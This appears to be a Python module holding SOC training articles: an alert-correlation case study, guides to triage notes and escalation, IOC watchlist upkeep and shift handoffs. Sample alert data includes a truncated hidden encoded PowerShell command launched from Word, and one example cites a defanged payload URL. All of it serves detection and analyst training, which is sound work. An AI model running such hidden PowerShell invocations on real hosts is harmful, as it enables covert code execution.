A-045    | 14:00:00         | Large Outbound Transfer        | Firewall  | 10.1.0.42
A-046    | 14:15:00         | New Inbox Rule Created         | O365      | j.martinez
A-047    | 14:30:00         | Data Upload to Cloud Storage   | Proxy     | 10.1.0.42
```

## Sample Alert Details

### A-003: PowerShell Encoded Command (Sysmon)

```json
{
  "alert_id": "A-003",
  "timestamp": "2026-02-10T08:18:47Z",
  "rule": "PowerShell Encoded Command",
  "severity": "high",
  "host": "ENGWS042",
  "user": "CORP\\j.martinez",
  "process": {
    "name": "powershell.exe",
    "parent": "WINWORD.EXE",
    "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA...",
    "pid": 8844
  },
  "mitre": ["T1059.001"]
}
```

### A-009: NTLM Auth from Unusual Source (Windows Security)

```json
{
  "alert_id": "A-009",
  "timestamp": "2026-02-10T09:20:00Z",
  "rule": "NTLM Authentication from Unusual Source",
  "severity": "medium",
  "host": "DC01",
  "user": "CORP\\svc_deploy",
  "source_ip": "10.1.0.42",
  "logon_type": 3,
  "auth_package": "NTLM",
  "mitre": ["T1550.002"]
}
```

### A-045: Large Outbound Transfer (Firewall)

```json
{
  "alert_id": "A-045",
  "timestamp": "2026-02-10T14:00:00Z",
  "rule": "Large Outbound Transfer",
  "severity": "high",
  "source_ip": "10.1.0.42",
  "dest_ip": "185.199.110.44",
  "bytes_out": 52428800,
  "protocol": "HTTPS",
  "mitre": ["T1041"]
}
```

## Query Examples

### KQL - Cluster alerts by shared entities

```kql
SecurityAlert
| where TimeGenerated between (datetime(2026-02-10T08:00:00Z) .. datetime(2026-02-10T15:00:00Z))
| extend Entities = parse_json(Entities)
| mv-expand Entity = Entities
| extend EntityType = tostring(Entity.Type),
         EntityValue = coalesce(
             tostring(Entity.HostName),
             tostring(Entity.Address),
             tostring(Entity.Name))
| where isnotempty(EntityValue)
| summarize AlertCount=count(),
            Alerts=make_set(AlertName),
            Severities=make_set(Severity),
            TimeRange=strcat(min(TimeGenerated), " - ", max(TimeGenerated))
    by EntityType, EntityValue
| where AlertCount > 2
| sort by AlertCount desc
```

### SPL - Build entity graph from alerts

```spl
index=alerts earliest="02/10/2026:08:00:00" latest="02/10/2026:15:00:00"
| eval entities=mvappend(src_host, dest_host, user, src_ip, dest_ip)
| mvexpand entities
| stats count as alert_count, values(alert_name) as rules,
        values(mitre_technique) as techniques,
        min(_time) as first_seen, max(_time) as last_seen
    by entities
| where alert_count > 2
| eval duration_min=round((last_seen - first_seen)/60, 0)
| sort - alert_count
| table entities, alert_count, duration_min, rules, techniques
```

### KQL - Reconstruct kill chain phases from alerts

```kql
SecurityAlert
| where TimeGenerated between (datetime(2026-02-10T08:00:00Z) .. datetime(2026-02-10T15:00:00Z))
| extend MitreTactics = parse_json(ExtendedProperties).MitreTactics
| extend Phase = case(
    MitreTactics has "InitialAccess", "1-Initial Access",
    MitreTactics has "Execution", "2-Execution",
    MitreTactics has "Persistence", "3-Persistence",
    MitreTactics has "PrivilegeEscalation", "4-Privilege Escalation",
    MitreTactics has "CredentialAccess", "5-Credential Access",
    MitreTactics has "Discovery", "6-Discovery",
    MitreTactics has "LateralMovement", "7-Lateral Movement",
    MitreTactics has "Collection", "8-Collection",
    MitreTactics has "Exfiltration", "9-Exfiltration",
    MitreTactics has "CommandAndControl", "10-C2",
    "99-Unknown")
| sort by Phase asc, TimeGenerated asc
| project TimeGenerated, Phase, AlertName, Severity,
          CompromisedEntity, Description
```

## Correlation Logic

**Entity-based correlation algorithm:**

```
Input: Set of alerts A = {a1, a2, ..., an}
Each alert has entities: hosts, IPs, users, processes

Step 1: Build entity graph
  For each alert, extract all entities
  Create edges between entities that co-occur in the same alert

Step 2: Find connected components
  Use graph traversal (BFS/DFS) to find clusters of related entities
  Each cluster = potential incident

Step 3: Time-order alerts within each cluster
  Sort by timestamp, assign kill chain phase

Step 4: Score incident severity
  severity = max(alert_severities) + (unique_hosts * 5) + (kill_chain_coverage * 10)
```

**Entity linking rules:**

| Entity A | Entity B | Link Condition |
|----------|----------|----------------|
| Host ENGWS042 | IP 10.1.0.42 | DHCP/ARP mapping |
| User j.martinez | Host ENGWS042 | Logon event |
| User svc_deploy | Host ENGWS042 | Used credentials from this host |
| IP 10.1.0.42 | IP 185.199.110.44 | Firewall session |

**Kill chain coverage scoring:**

| Phases Covered | Score | Assessment |
|----------------|-------|------------|
| 1-2 phases | 20 | Possible attempt |
| 3-4 phases | 50 | Probable compromise |
| 5-6 phases | 75 | Confirmed compromise |
| 7+ phases | 95 | Full attack chain |

## Timeline Reconstruction

### Phase 1: Initial Access (08:15 - 08:19)

| Alert | Time | Detail |
|-------|------|--------|
| A-001 | 08:15 | Phishing email with macro doc delivered to j.martinez |
| A-002 | 08:18 | WINWORD.EXE macro executed on ENGWS042 |
| A-003 | 08:18 | Encoded PowerShell spawned by Word |
| A-004 | 08:19 | Outbound HTTPS to C2 domain |

### Phase 2: Establish Foothold (08:19 - 09:00)

| Alert | Time | Detail |
|-------|------|--------|
| A-005 | 08:22 | Scheduled task created for persistence |
| A-006 | 09:00 | Regular beaconing detected (60s interval) |

### Phase 3: Credential Access (09:15 - 09:20)

| Alert | Time | Detail |
|-------|------|--------|
| A-007 | 09:15 | Mimikatz behavior detected by CrowdStrike |
| A-008 | 09:16 | LSASS memory access by suspicious process |

### Phase 4: Lateral Movement (09:20 - 10:30)

| Alert | Time | Detail |
|-------|------|--------|
| A-009 | 09:20 | svc_deploy NTLM auth from ENGWS042 |
| A-010 | 09:22 | Type 3 logon to ENGWS015 |
| A-011-025 | 09:30-10:30 | Spread to 8 additional hosts |

### Phase 5: Data Staging and Exfiltration (13:00 - 14:30)

| Alert | Time | Detail |
|-------|------|--------|
| A-040-044 | 13:00-13:45 | File access and archival on file servers |
| A-045 | 14:00 | 50MB outbound transfer to external IP |
| A-046 | 14:15 | Inbox rule created (BEC preparation) |
| A-047 | 14:30 | Data uploaded to cloud storage |

## Incident Summary Dashboard

```
Incident ID: INC-2026-0210-001
Classification: APT / Multi-Stage Compromise
Duration: 6 hours 15 minutes (08:15 - 14:30 UTC)
Kill Chain Coverage: 8/9 phases (Initial Access through Exfiltration)

Affected Assets:
  - 10 workstations (ENGWS042, ENGWS015, ... )
  - 2 file servers (FILESRV01, FILESRV02)
  - 1 domain controller (DC01)

Compromised Accounts:
  - j.martinez (initial victim)
  - svc_deploy (service account, pass-the-hash)

Data Impact:
  - ~50MB exfiltrated to external destination
  - Financial documents accessed on file servers
  - Email inbox rule for BEC preparation

Alert Correlation:
  - 47 raw alerts -> 1 correlated incident
  - 15 unique detection rules triggered
  - 6 log sources contributed
```

## Conclusions

- 47 individual alerts were correlated into a single APT incident using
  entity-based graph analysis
- The attack progressed through 8 kill chain phases in 6 hours
- Without correlation, the SOC would have triaged 47 separate alerts,
  likely missing the connection between email, endpoint, network, and
  identity events
- Key correlation pivots: host-to-IP mapping, user-to-host logon events,
  and shared C2 infrastructure (IP 185.199.110.44)
- Automated correlation reduced mean-time-to-detect from hours to minutes

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Phishing: Spearphishing Attachment | T1566.001 | Initial Access |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Execution |
| Scheduled Task/Job: Scheduled Task | T1053.005 | Persistence |
| OS Credential Dumping: LSASS Memory | T1003.001 | Credential Access |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | Lateral Movement |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |
| Email Hiding Rules | T1564.008 | Defense Evasion |
"""
    ))

    return articles


def soc_tradecraft_articles():
    """Return 16 SOC tradecraft and analyst process articles for the knowledge base."""

    articles = []

    # ---------- Article 1 ----------
    articles.append((
        "Writing Effective Alert Triage Notes",
        ["soc-operations", "triage", "documentation", "alert-handling"],
        r"""# Writing Effective Alert Triage Notes

## Why Triage Notes Matter

Every alert you touch becomes part of the institutional memory of your SOC. Good triage notes save the next analyst hours of rework. Bad notes (or no notes) mean the same alert gets investigated from scratch every time it fires.

The goal is simple: **anyone reading your note should understand what happened, what you checked, and why you made the decision you did** -- without having to message you on Slack at 2 AM.

---

## The STAR Framework for Triage Notes

Use **STAR** as a mental checklist every time you document triage:

| Letter | Meaning | What to Write |
|--------|---------|---------------|
| **S** | Summary | One-line plain-English description of the alert |
| **T** | Telemetry | What data sources you examined and key observables |
| **A** | Analysis | Your reasoning -- what matched, what didn't, what you ruled out |
| **R** | Resolution | Your verdict and next action (close, escalate, enrich, watch) |

### Example Using STAR

```
S: Outbound connection to known C2 IP 198.51.100.44 from WKSTN-FIN-023
T: Checked firewall logs (allowed, 3 connections over 12 min), EDR timeline
   (chrome.exe -> powershell.exe spawned 2 min prior), VirusTotal (IP flagged
   by 8/90 vendors, associated with Cobalt Strike), DHCP lease confirms
   user jsmith@corp.local on that workstation.
A: PowerShell spawned from browser is suspicious. The destination IP appears
   in multiple TI feeds tagged Cobalt Strike. Connection timing aligns with
   user browsing activity but the PS execution is anomalous for this user
   profile. No matching pattern in last 90 days of jsmith's host telemetry.
R: ESCALATE to Tier 2 as probable initial access / C2 beaconing.
   Contained host via EDR network isolation pending T2 review.
```

---

## Do's and Don'ts

### Do

- **Timestamp your actions** -- "At 14:32 UTC I isolated the host" not "I isolated the host."
- **Record negative findings** -- "Checked proxy logs: no additional suspicious destinations" is valuable.
- **Include specific artifact values** -- hashes, IPs, domain names, usernames, hostnames.
- **Note which tools you used** -- "Searched Splunk index=firewall for dest_ip=198.51.100.44 last 24h."
- **State your confidence level** -- "High confidence this is a true positive based on correlated EDR + network evidence."
- **Use consistent terminology** -- adopt your SOC's lexicon for verdicts (TP, FP, Benign, Suspicious, etc.).

### Don't

- Don't write "Looks fine, closing." -- this tells the next analyst nothing.
- Don't paste raw JSON blobs without summarizing what matters.
- Don't use abbreviations without defining them the first time -- not everyone knows your tool's field names.
- Don't skip documenting false positives -- FP patterns are gold for tuning.
- Don't forget to record what you *didn't* have access to: "Unable to check email gateway logs (no access); recommend T2 verify."

---

## Templates for Common Scenarios

### False Positive Template

```
ALERT: [Alert Name] | [Alert ID]
VERDICT: False Positive
REASON: [Specific reason -- e.g., known scanner, approved tool, test activity]
EVIDENCE:
  - [Observable 1]: [What you found]
  - [Observable 2]: [What you found]
TUNING RECOMMENDATION: [If applicable -- e.g., "Add src_ip to whitelist for this rule"]
TIME SPENT: [Minutes]
```

### Escalation Template

```
ALERT: [Alert Name] | [Alert ID]
VERDICT: Escalate to [Tier/Team]
PRIORITY: [Critical/High/Medium]
SUMMARY: [One sentence]
KEY FINDINGS:
  1. [Finding with evidence]
  2. [Finding with evidence]
  3. [Finding with evidence]
ACTIONS TAKEN:
  - [Action 1 with timestamp]
  - [Action 2 with timestamp]
PENDING QUESTIONS:
  - [What you couldn't determine and why]
AFFECTED ASSETS: [Hosts, users, services]
```

### Duplicate / Recurring Alert Template

```
ALERT: [Alert Name] | [Alert ID]
VERDICT: Duplicate of [Previous Ticket/Alert ID]
NOTE: This is occurrence #[N] in [timeframe]. Root cause addressed in
      [ticket]. If this continues past [date], reopen for rule tuning.
```

---

## Quality Checklist

Before you close or escalate any alert, verify your notes answer these questions:

- [ ] Could a new analyst understand this without asking me questions?
- [ ] Did I record all IOCs (IPs, hashes, domains, usernames)?
- [ ] Did I note which data sources I checked AND which I could not check?
- [ ] Did I include timestamps for actions taken?
- [ ] Did I state my verdict clearly with reasoning?
- [ ] If FP: did I note whether a tuning request is needed?
- [ ] If escalated: did I include enough context for the next tier to continue without starting over?

---

## Common Pitfalls in Real SOCs

### The Copy-Paste Trap
Analysts copy the alert description as their "notes." This adds zero value. The alert description is already in the system. Your job is to add *analysis*.

### The Hindsight Problem
You investigated for 20 minutes and found it was benign. Don't just write "FP." Document the journey -- the next analyst facing the same alert will follow the same 20-minute path unless you leave breadcrumbs.

### The Over-Documentation Trap
There is a balance. A 500-word essay on a known-benign vulnerability scanner alert is overkill. Use your templates to stay concise. If the alert is routine and matches a known pattern, reference the pattern: "Matches known FP pattern SOC-FP-042 (Nessus scan from 10.1.1.50)."

---

## Measuring Note Quality

SOC leads should periodically audit triage notes. A simple rubric:

| Criterion | 0 Points | 1 Point | 2 Points |
|-----------|----------|---------|----------|
| Summary present | No | Partial | Clear one-liner |
| Evidence cited | None | Some artifacts | All relevant artifacts with sources |
| Reasoning documented | No | Verdict stated, no reasoning | Verdict with clear logic |
| Actionable next steps | None | Vague | Specific with context |

**Target: 6-8 points per note.** Track averages per analyst over time to identify coaching opportunities.

---

## References

- NIST SP 800-61 Rev 2: Computer Security Incident Handling Guide (Section 3.2 on documentation)
- SANS SOC Class (SEC450): Triage documentation best practices
- The SOC Analyst's Handbook -- best practices for operational documentation
"""
    ))

    # ---------- Article 2 ----------
    articles.append((
        "Escalation Decision Framework with Worked Examples",
        ["soc-operations", "escalation", "decision-making", "incident-response"],
        r"""# Escalation Decision Framework with Worked Examples

## The Core Problem

Every SOC analyst faces the same dilemma dozens of times per shift: **Do I escalate this, or close it?** Escalate too much and you overwhelm Tier 2 with noise. Escalate too little and you miss real incidents. This framework gives you a structured way to make that call.

---

## The Three-Gate Escalation Model

Before escalating, run the alert through three gates. If it passes any gate, escalate.

### Gate 1: Confirmed Malicious Activity

Evidence shows an attack that has succeeded or is actively in progress.

**Indicators:**
- Malware execution confirmed by EDR
- Data exfiltration observed in network logs
- Credential compromise verified (e.g., impossible travel with confirmed session hijack)
- Lateral movement between hosts
- Ransomware encryption activity

**Action:** Immediate escalation. Do not wait. Contain if authorized.

### Gate 2: High-Confidence Suspicious Activity

Multiple correlated signals suggest malicious activity but no single conclusive indicator.

**Threshold:** Two or more of the following:
- Alert from a high-fidelity detection rule (known low FP rate)
- Unusual behavior for the specific user/host (deviation from baseline)
- IOC match against current threat intelligence
- Temporal correlation with other alerts on the same host or user
- Activity during unusual hours for the affected user

**Action:** Escalate with your correlation analysis documented.

### Gate 3: Impact or Sensitivity Threshold

The potential impact justifies escalation even if confidence is moderate.

**Triggers:**
- Executive or VIP user involved
- Critical infrastructure system (domain controllers, SCADA, financial systems)
- Regulated data potentially affected (PII, PHI, PCI)
- External-facing system compromised
- Third-party or supply chain vector suspected

**Action:** Escalate with impact assessment noted.

---

## Decision Matrix

| Confidence | Low Impact | Medium Impact | High Impact |
|-----------|-----------|--------------|------------|
| **High** | Escalate | Escalate (urgent) | Escalate (critical) |
| **Medium** | Enrich + reassess | Escalate | Escalate (urgent) |
| **Low** | Close with notes | Enrich + reassess | Escalate with caveats |

---

## Worked Examples

### Example 1: Phishing Email Reported by User

**Alert:** User reports suspicious email with attachment.

**Triage findings:**
- Email from external sender, display name spoofs internal executive
- Attachment is a .docm file; sandbox detonation shows macro executes PowerShell
- PowerShell attempts to download from `hxxps://cdn-update[.]xyz/payload.exe`
- Domain registered 48 hours ago, no categorization
- No evidence the user opened the attachment (EDR shows no macro execution)

**Gate check:**
- Gate 1: No confirmed malicious execution -- FAIL
- Gate 2: High-fidelity indicators (weaponized macro + fresh C2 domain + exec impersonation) -- PASS
- Gate 3: Executive impersonation, possible targeted attack -- PASS

**Decision:** ESCALATE. Two gates passed. Note that no execution occurred but the targeting suggests a campaign. Recommend proactive email sweep for similar messages to other recipients.

### Example 2: Failed Login Brute Force

**Alert:** 50 failed logins to VPN portal from single IP in 10 minutes.

**Triage findings:**
- Source IP is a known Tor exit node
- Targeted username: `admin@corp.com` (generic, not a real user account)
- All attempts failed; no successful authentication
- VPN has account lockout after 10 attempts; lockout triggered
- This pattern seen 3x this week from different Tor exits

**Gate check:**
- Gate 1: No successful compromise -- FAIL
- Gate 2: Single signal (brute force), no correlation with other activity -- FAIL
- Gate 3: VPN is external-facing but `admin` is not a real account -- BORDERLINE

**Decision:** CLOSE with notes. This is opportunistic scanning. Document the pattern and verify account lockout is working. Add a note that if a real username is targeted, re-evaluate. File a tuning request to suppress this specific pattern after 3 documented occurrences.

### Example 3: DNS Query to Known Bad Domain

**Alert:** Host WKSTN-MKT-007 queried `evil-domain[.]ru` which is on the TI blocklist.

**Triage findings:**
- Single DNS query, no resolution (NXDOMAIN)
- User was browsing a security blog that mentioned the domain in an article
- Browser history shows the blog post URL with the domain visible in text
- No process other than the browser generated the query
- EDR shows no suspicious process activity on the host

**Gate check:**
- Gate 1: No malicious activity -- FAIL
- Gate 2: Single signal, explained by user behavior -- FAIL
- Gate 3: No sensitive assets involved -- FAIL

**Decision:** CLOSE as benign. The DNS query was triggered by the browser pre-fetching a domain mentioned in article text. Document the root cause clearly so the next analyst seeing this pattern can close quickly.

### Example 4: Anomalous Data Transfer

**Alert:** Host DB-PROD-01 transferred 4.2 GB to external IP over 3 hours (after hours).

**Triage findings:**
- Destination IP belongs to a cloud backup provider (verified via WHOIS and ASN)
- No scheduled backup job for this host in the CMDB
- The transfer used port 443 (HTTPS) -- encrypted, no DLP visibility
- Host owner (DBA team) is on PTO this week
- Last authorized change to the host was 2 weeks ago

**Gate check:**
- Gate 1: Cannot confirm malicious but cannot confirm benign either -- INCONCLUSIVE
- Gate 2: After-hours + large transfer + no scheduled job + owner on PTO = multiple signals -- PASS
- Gate 3: Production database server with potentially regulated data -- PASS

**Decision:** ESCALATE (urgent). Two gates passed and the asset is high-value. The DBA being on PTO means we cannot quickly verify if this is authorized. Recommend Tier 2 contact DBA team lead and consider blocking the destination IP pending verification.

---

## What to Include in an Escalation

Every escalation should contain:

1. **Alert summary** -- one sentence describing the trigger
2. **Key observables** -- IPs, domains, hashes, usernames, hostnames
3. **What you verified** -- data sources checked and findings
4. **What you could not verify** -- gaps in visibility or access
5. **Your assessment** -- which gate(s) triggered and why
6. **Actions already taken** -- containment, enrichment, notifications
7. **Recommended next steps** -- what Tier 2 should do first

---

## Anti-Patterns to Avoid

| Anti-Pattern | Why It Hurts | Better Approach |
|-------------|-------------|-----------------|
| "Escalating just in case" | Erodes trust, floods T2 queue | Use the gate framework; document your reasoning |
| Sitting on a hot alert | Delays response to real incidents | If Gate 1 triggers, escalate immediately; time matters |
| Escalating without enrichment | T2 has to redo your work | Spend 5-10 min enriching before escalating |
| Not escalating because you're unsure | Missed incidents are worse than over-escalation | When in doubt and impact is high, escalate with caveats |
| Escalating via Slack instead of the ticket system | No audit trail, dropped handoffs | Always create a ticket; Slack is supplementary |

---

## Calibrating Your Threshold Over Time

Track your escalations monthly:

- **Escalation-to-incident ratio**: What percentage of your escalations became real incidents? Aim for 30-50%.
- **Missed incidents**: Were there incidents that you triaged and closed? Root-cause each one.
- **Time to escalate**: How long between alert firing and your escalation? Track and minimize.

Review these metrics with your team lead quarterly. Adjust your personal thresholds based on the data, not gut feeling.

---

## References

- NIST SP 800-61: Incident prioritization matrix
- FIRST.org: Traffic Light Protocol for sharing escalation context
- SANS SEC450: SOC Operations -- escalation procedures
- The Pyramid of Pain (David Bianco) -- for assessing IOC value in escalation decisions
"""
    ))

    # ---------- Article 3 ----------
    articles.append((
        "Building and Maintaining IOC Watchlists",
        ["threat-intelligence", "ioc", "watchlists", "soc-operations"],
        r"""# Building and Maintaining IOC Watchlists

## What Is an IOC Watchlist?

An IOC (Indicator of Compromise) watchlist is a curated collection of known-malicious or suspicious artifacts -- IP addresses, domain names, file hashes, URLs, email addresses -- that your detection systems monitor for matches against live telemetry.

A well-maintained watchlist is a force multiplier. A neglected one generates noise, wastes analyst time, and erodes trust in your detection capability.

---

## Types of IOCs and Their Shelf Life

Not all IOCs are created equal. Understanding decay rates is critical for maintaining useful watchlists.

| IOC Type | Typical Shelf Life | Notes |
|----------|-------------------|-------|
| File hashes (MD5/SHA256) | Months to years | Stable but easily changed by adversary |
| IP addresses | Days to weeks | Adversaries rotate infrastructure rapidly |
| Domain names | Weeks to months | Longer-lived than IPs but still transient |
| URLs | Days to weeks | Path components change frequently |
| Email addresses | Weeks to months | Useful for phishing campaigns |
| TLS certificate hashes | Months | More stable than IPs; underutilized |
| JA3/JA3S fingerprints | Months to years | Network fingerprints of TLS clients/servers |
| YARA rules | Months to years | Behavioral; more durable than atomic IOCs |

### The Pyramid of Pain

David Bianco's Pyramid of Pain ranks IOC types by how much pain they cause the adversary when detected:

```
         /  TTPs  \          <-- Hardest to change; highest detection value
        / Tooling  \
       /  Artifacts  \
      / Network/Host  \
     / Domain Names    \
    /  IP Addresses     \
   /   Hash Values       \   <-- Easiest to change; lowest detection value
```

**Key insight:** Invest more effort in higher-pyramid indicators. A YARA rule detecting a malware family's code patterns survives longer than a hash of one sample.

---

## Building Your Watchlist: Sources

### Tier 1: High-Confidence Feeds (Automate)

- **MISP communities** -- structured threat sharing with confidence tags
- **Commercial TI platforms** (Recorded Future, Mandiant, CrowdStrike)
- **CISA/US-CERT advisories** -- government-vetted indicators
- **Vendor-specific feeds** (Microsoft Defender TI, Google Threat Analysis Group)

### Tier 2: Community Intelligence (Curate)

- **AlienVault OTX** -- community-contributed pulses
- **Abuse.ch** (URLhaus, MalwareBazaar, ThreatFox, Feodo Tracker)
- **PhishTank** -- community-validated phishing URLs
- **Twitter/Mastodon TI community** -- researcher-shared IOCs (need validation)

### Tier 3: Internal Sources (Your Most Valuable)

- **Your own incident investigations** -- IOCs from confirmed incidents in YOUR environment
- **Threat hunting findings** -- artifacts discovered proactively
- **Phishing reports from employees** -- sender addresses, URLs, attachment hashes
- **Red team / purple team exercises** -- tools and infrastructure used

---

## Watchlist Structure and Metadata

Every IOC entry should carry metadata. Bare indicators without context are nearly useless.

### Required Fields

```
{
  "indicator": "198.51.100.44",
  "type": "ipv4-addr",
  "added_date": "2025-03-15",
  "expiry_date": "2025-04-15",
  "source": "Mandiant APT29 report MAR-2025-1234",
  "confidence": "high",
  "threat_actor": "APT29",
  "campaign": "SolarPhoenix",
  "tags": ["c2", "cobalt-strike"],
  "context": "Cobalt Strike C2 server used in phishing campaign targeting finance sector",
  "added_by": "analyst_jdoe",
  "tlp": "amber"
}
```

### Confidence Scoring

| Score | Meaning | Typical Source |
|-------|---------|----------------|
| **High (80-100)** | Confirmed malicious through direct analysis | Your own IR, vendor-confirmed reports |
| **Medium (40-79)** | Reported malicious by credible source, not independently verified | TI feeds, ISAC reports |
| **Low (1-39)** | Potentially malicious; limited corroboration | Single community report, unverified social media |

---

## Maintenance: The Part Everyone Skips

### Daily Tasks
- Review new additions from automated feeds for obvious false positives (e.g., CDN IPs, Google DNS)
- Check for alerts triggered by watchlist matches and validate accuracy

### Weekly Tasks
- Review IOCs approaching expiry date -- extend or remove based on current intelligence
- Cross-reference new threat reports with existing watchlist for updates
- Remove IOCs confirmed as false positives or sinkholed domains

### Monthly Tasks
- Audit watchlist size and growth rate
- Review IOC age distribution -- what percentage is older than 90 days?
- Check hit rates: which IOCs are generating matches? Which have never matched?
- Purge zero-hit IOCs older than their shelf life

### Quarterly Tasks
- Review feed sources: are they still active? Still relevant to your threat model?
- Benchmark your watchlist against a known campaign report to test coverage
- Review and update confidence scores based on accumulated evidence

---

## Common Mistakes

### Mistake 1: Never Expiring IOCs
An IP address that was a C2 server 18 months ago is probably now reassigned to a legitimate service. Set expiry dates and enforce them.

### Mistake 2: Adding Every IOC from Every Feed
More is not better. A watchlist with 5 million low-confidence indicators will generate thousands of false positive matches. Curate aggressively.

### Mistake 3: No Context on Entries
An IP address without context forces the responding analyst to re-research it. Always include source, threat actor, campaign, and the role of the IOC (C2, exfil, delivery, etc.).

### Mistake 4: Ignoring Internal IOCs
Your own incidents are the most relevant intelligence for your environment. A hash from your own IR investigation is worth more than 1,000 hashes from a generic feed.

### Mistake 5: Not Validating Feeds
Before adding a new feed, back-test it against your historical data. Does it match known incidents? Does it generate excessive false positives? Run a 30-day trial before committing.

---

## Automation Tips

### Auto-Expiry Script Logic

```python
from datetime import datetime, timedelta

def audit_watchlist(watchlist):
    today = datetime.utcnow()
    for entry in watchlist:
        age = today - entry["added_date"]
        shelf_life = get_shelf_life(entry["type"])
        if age > shelf_life and entry["hit_count"] == 0:
            entry["status"] = "expired"
            entry["reason"] = f"No hits in {age.days} days, exceeds shelf life"
        elif age > shelf_life and entry["hit_count"] > 0:
            entry["status"] = "review"
            entry["reason"] = f"Has {entry['hit_count']} hits but exceeds shelf life"

def get_shelf_life(ioc_type):
    shelf_lives = {
        "ipv4-addr": timedelta(days=30),
        "domain-name": timedelta(days=90),
        "file-hash": timedelta(days=365),
        "url": timedelta(days=14),
        "email-addr": timedelta(days=90),
    }
    return shelf_lives.get(ioc_type, timedelta(days=60))
```

### SIEM Integration Checklist

- [ ] Watchlist syncs to SIEM lookup table on a schedule (not manually)
- [ ] SIEM correlation rules reference the watchlist with context fields
- [ ] Alert output includes the watchlist metadata (source, confidence, campaign)
- [ ] Expired entries are automatically removed from the SIEM lookup
- [ ] Hit counts are fed back to the watchlist management system

---

## Metrics for Watchlist Health

| Metric | Healthy Range | Red Flag |
|--------|--------------|----------|
| Total IOC count | Depends on org size; 10K-100K typical | Over 1M without curation |
| IOCs with expiry date set | >95% | <50% |
| IOCs past expiry without review | <5% | >20% |
| Average IOC age | <90 days | >180 days |
| Hit rate (IOCs with at least 1 match in 30 days) | 1-5% | >15% (possible FP issue) or 0% (possible relevance issue) |
| False positive rate on watchlist alerts | <10% | >25% |

---

## References

- David Bianco, "The Pyramid of Pain" -- IOC value hierarchy
- MISP Project documentation -- structured threat intelligence sharing
- STIX/TAXII standards -- for IOC exchange formats
- SANS FOR578: Cyber Threat Intelligence -- watchlist management practices
- Abuse.ch projects -- community IOC feeds
"""
    ))

    # ---------- Article 4 ----------
    articles.append((
        "Effective Handoff Between SOC Shifts",
        ["soc-operations", "shift-handoff", "communication", "teamwork"],
        r"""# Effective Handoff Between SOC Shifts

## Why Shift Handoffs Are Critical

A SOC operates 24/7, but analysts don't. The seams between shifts are where incidents get dropped, context gets lost, and adversaries gain time. A structured handoff process is the single most impactful operational improvement most SOCs can make.

**The cost of a bad handoff:**
- Investigation progress lost, duplicated work
- Escalations delayed by hours while the next shift "catches up"
- Active containment actions dropped or contradicted
- Analyst frustration and burnout from always starting from zero

---

## The Handoff Briefing Structure

Use this standard structure for every shift transition. It should take 10-15 minutes.

### 1. Active Incidents (Top Priority)

For each open incident:
- **Incident ID and summary** (one sentence)
- **Current status** -- what phase? (detection, containment, eradication, recovery)
- **Last action taken** and by whom
- **Next action required** and any deadlines
- **Key contacts** -- who is the incident lead? Who from the business is involved?
- **Blockers** -- anything the incoming shift needs to chase

### 2. Alerts in Progress

Alerts that were being triaged when the shift ended:
- **Alert ID and type**
- **How far you got** in the triage process
- **What you found so far** and what remains to check
- **Your preliminary assessment** -- leaning TP or FP?

### 3. Environmental Context

Changes to the environment that affect monitoring:
- **Scheduled maintenance windows** (reduced alerts expected from X systems)
- **Known outages** (certain log sources unavailable)
- **New detection rules deployed** (expect possible tuning needs)
- **Threat advisories received** (new campaigns to watch for)

### 4. Metrics Snapshot

Quick operational stats from the departing shift:
- Total alerts handled
- Number escalated
- Mean time to triage
- Any SLA breaches or near-misses

### 5. General Notes

Anything else the incoming shift should know:
- Tool issues (SIEM slow, EDR console down for patching)
- Management requests or upcoming audits
- Personnel notes (analyst X is out sick tomorrow, coverage needed)

---

## Handoff Document Template

```markdown
# SOC Shift Handoff: [Date] [Departing Shift] -> [Incoming Shift]

## Active Incidents

### INC-2025-0142: Suspected BEC Compromise - CFO Email
- **Status:** Containment -- password reset done, mailbox audit in progress
- **Last Action:** Pulled 48h email forwarding rules at 18:45 UTC (analyst: jdoe)
- **Next Action:** Review forwarding rule results; check for OAuth app registrations
- **Deadline:** Legal wants preliminary assessment by 09:00 UTC
- **Contacts:** Legal - Sarah Chen (ext 4401), IT Admin - Mike Torres
- **Blocker:** Need Global Admin to pull Azure AD sign-in logs -- ticket ITSM-8823

### INC-2025-0143: Cryptominer on LNXSRV-DEV-04
- **Status:** Eradication -- malicious cron job removed, monitoring for recurrence
- **Last Action:** Killed process, removed cron entry, rotated SSH keys at 19:20 UTC
- **Next Action:** Monitor for 4 hours; if clean, move to recovery
- **Contacts:** DevOps - Lin Park (Slack: @lpark)
- **Blocker:** None

## Alerts in Progress

| Alert ID | Type | Status | Notes |
|----------|------|--------|-------|
| ALT-44892 | Suspicious DNS | 70% triaged | Checking if the domain is a CDN; waiting on passive DNS results |
| ALT-44901 | Brute force | Just opened | 200 failed logins to OWA from single IP; not started |

## Environmental Context

- **Maintenance:** Network team patching core switches 02:00-04:00 UTC. Expect
  intermittent NetFlow gaps. Alert suppressions in place for switch management IPs.
- **New Rule:** DET-2025-089 (Kerberoasting detection) went live at 16:00 UTC.
  May need tuning; watch for FPs from service account enumeration tools.
- **Advisory:** CISA AA25-076A published today -- Volt Typhoon targeting utilities.
  Our sector. IOCs added to watchlist; relevant detections reviewed and confirmed active.

## Shift Metrics

| Metric | Value |
|--------|-------|
| Total alerts triaged | 47 |
| Escalated | 3 |
| Mean triage time | 8 min |
| SLA breaches | 0 |

## General Notes

- SIEM search performance degraded after 17:00 UTC. Ticket filed (ITSM-8830).
  Workaround: use shorter time ranges in queries.
- Reminder: SOC all-hands meeting at 14:00 UTC tomorrow. All analysts attend.
```

---

## Do's and Don'ts

### Do

- **Use a standardized written format** -- verbal-only handoffs lose information.
- **Prioritize ruthlessly** -- lead with active incidents, not routine metrics.
- **Allow Q&A time** -- the incoming shift should ask questions before the departing shift logs off.
- **Overlap shifts by 15-30 minutes** -- this overlap pays for itself in continuity.
- **Record the handoff** -- keep handoff documents in a shared location (wiki, ticket system, shared drive).
- **Include emotional context** -- "This was a heavy shift, I'm concerned about INC-0142" is useful information.

### Don't

- Don't assume the incoming shift read the ticket updates -- summarize verbally.
- Don't leave investigation artifacts only in your browser tabs -- save searches, export results, bookmark URLs in the ticket.
- Don't hand off containment actions without confirmation -- "I started isolating the host" is dangerous if it's half-done.
